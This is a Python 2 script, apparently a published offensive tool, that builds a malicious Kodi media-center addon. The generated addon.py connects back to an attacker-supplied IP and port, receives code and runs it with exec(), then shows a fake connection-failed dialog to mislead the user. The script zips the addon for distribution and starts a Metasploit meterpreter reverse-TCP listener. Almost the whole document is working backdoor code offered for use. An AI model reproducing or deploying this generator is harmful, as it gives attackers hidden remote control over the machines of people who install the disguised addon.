import os
import sys
import io
import shutil
import zipfile
import time

os.system("tput reset")

class colors:
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	BOLD = '\033[1m'
	

#Create temp folder
def newDir(path):
	try:
		os.mkdir(path, 0755);
		print colors.OKGREEN + "[*] Temp dir is created..." + colors.ENDC
	except OSError:
		print colors.WARNING + "[*] Temp dir already exist..." + colors.ENDC

#Create addon.xml
def addonXml(addon_id, addon_name, addon_desc):
	with io.FileIO("KodiBackdoor/addon.xml", "w") as file:
		file.write('''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<addon id="'''+addon_id+'''" name="'''+addon_name+'''" version="1.0.0" provider-name="luka">
	<requires>
		<import addon="xbmc.python" version="2.14.0"/>
	</requires>
	<extension point="xbmc.python.script" library="addon.py">
		<provides>executable</provides>
	</extension>
	<extension point="xbmc.addon.metadata">
		<platform>all</platform>
		<summary lang="en">'''+addon_name+'''</summary>
		<description lang="en">'''+addon_desc+'''</description>
		<license>GNU General Public License, v2</license>
		<language></language>
		<email>webmaster@localhost</email>
		<assets>
			<icon>resources/icon.png</icon>
			<fanart>resources/fanart.jpg</fanart>
		</assets>
		<news>'''+addon_desc+'''</news>
	</extension>
</addon>
''')

#Create addon.py
def addonPy(ip, port):
	with io.FileIO("KodiBackdoor/addon.py", "w") as file:
		file.write('''
import xbmcaddon
import xbmcgui
import socket,struct
addon       = xbmcaddon.Addon()
addonname   = addon.getAddonInfo('name')
line1 = "Error!"
line2 = "An error occurred"
line3 = "Connection to server failed... please try again later"
s=socket.socket(2,1)
s.connect(("'''+ip+'''",'''+port+'''))
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(4096)
while len(d)!=l:
    d+=s.recv(4096)
exec(d,{'s':s})
xbmcgui.Dialog().ok(addonname, line1, line2, line3)
''')

#Zip folder
def zipdir(path, ziph):
    # ziph is zipfile handle
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))


print colors.HEADER + """
#############################################
#        Kodi Backdoor Generator v1.0       #
#___________________________________________#
#        Author: Luka Sikic @CroCyber       #
#	 Facebook: fb.com/cyber1337         #
#        Contact: laceratus37@gmail.com     #
#############################################
""" + colors.ENDC


addon_name = raw_input(colors.OKBLUE + "[?] Addon Name (example:Kodi backdoor): " + colors.ENDC)
addon_id = raw_input(colors.OKBLUE + "[?] Addon ID(example: kodi.leet.backdoor): " + colors.ENDC)
addon_desc = raw_input(colors.OKBLUE + "[?] Addon Description (example: Kodi Reverse Shell): " + colors.ENDC)
ip = raw_input(colors.OKBLUE + "[?] Your IP: " + colors.ENDC)
port = raw_input(colors.OKBLUE + "[?] Your Port: " + colors.ENDC)

#create Temp folder
newDir("KodiBackdoor")
time.sleep(1)
#create XML addon
addonXml(addon_id, addon_name, addon_desc)
print colors.OKGREEN + "[*] XML File Generated..." + colors.ENDC
time.sleep(1)
#Create addon.py
addonPy(ip, port)
print colors.OKGREEN + "[*] Backdoor File Generated..." + colors.ENDC
print colors.OKGREEN + "[*] Putting everything in ZIP file... " + colors.ENDC
time.sleep(1)
#create zip final
zipf = zipfile.ZipFile(addon_id+'.zip', 'w', zipfile.ZIP_DEFLATED)
zipdir('KodiBackdoor', zipf)
zipf.close()

#delete temp dir
os.system("rm -rf KodiBackdoor")

print colors.OKGREEN + "[*] Starting meterpreter listener... this may take a while" + colors.ENDC
os.system('msfconsole -x "use multi/handler;\set LHOST '+ip+';\set LPORT '+port+';\set PAYLOAD python/meterpreter/reverse_tcp;\exploit"')
